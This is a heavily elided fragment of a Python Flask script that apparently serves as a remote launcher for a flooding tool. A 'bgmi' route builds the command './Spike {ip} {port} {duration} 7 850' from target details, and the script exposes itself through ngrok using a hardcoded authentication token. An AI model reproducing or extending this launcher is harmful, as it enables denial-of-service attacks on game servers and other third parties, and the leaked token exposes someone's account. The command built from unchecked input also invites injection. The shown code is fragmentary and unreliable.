...
def configure_ngrok():
    ngrok_token = "2qqGiYallIO43P1FskvdknZkFqx_JGzAnLyiNjbAAXHHYYcR"
    try:
...
def update_vps_soul_txt(public_url):
    try:
        with open("binder1.txt", "w") as file:
            file.write(public_url)
        print("Updated binder1.txt locally successfully.")
    except Exception as e:
        print(f"Failed to update binder1.txt locally: {str(e)}")
...
def run_flask_app():
    ...
    def bgmi():
        ...
        command = f"./Spike {ip} {port} {duration} 7 850"
